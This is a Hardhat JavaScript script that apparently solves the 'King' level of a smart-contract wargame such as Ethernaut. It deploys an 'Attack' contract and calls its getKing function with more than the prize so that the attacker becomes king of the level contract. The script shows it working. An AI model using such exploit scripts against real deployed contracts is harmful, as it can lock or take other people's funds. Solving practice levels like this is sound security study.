// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const BigNumber = require('bignumber.js');
const { assert } = require("chai");

async function main() {

  const accounts = await hre.ethers.getSigners()
  let Level_Address = '0x598a230b9Bb8EBaebb211E5B28b7b5FBCbAF157A'
  const payer = accounts[0]

  // let King = await hre.ethers.getContractFactory('King')
  // let king = await King.deploy({value:1})
  // await king.deployed()
  // Level_Address = king.address
  console.log('begin level',  Level_Address, 'payer', payer.address)

  const abi = [
    // Read-Only Functions
    "function prize() view returns (uint)",
    "function _king() public view returns (address payable)",
    "function owner() view returns (address)",
  ];
  const kingit = new hre.ethers.Contract(Level_Address, abi, payer);
  let price = await kingit.prize()
  console.log('price', (await kingit.prize()).toNumber())
  console.log('owner', await kingit.owner())
  console.log('_king', await kingit._king())

  let Attack = await hre.ethers.getContractFactory('Attack')
  let attack = await Attack.deploy(Level_Address)
  await attack.deployed()

  console.log('price', (await kingit.prize()).toNumber())
  console.log('owner', await kingit.owner())
  console.log('_king', await kingit._king())

  let tx = await attack.getKing({value:price+2, gasLimit: 30000000})
  let txinfo = await tx.wait()
  console.log('getKing txhash', txinfo.blockNumber, txinfo.transactionHash)

  console.log('price', (await kingit.prize()).toNumber())
  console.log('owner', await kingit.owner())
  console.log('_king', await kingit._king())

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });



  // npx hardhat run 9.King/run.js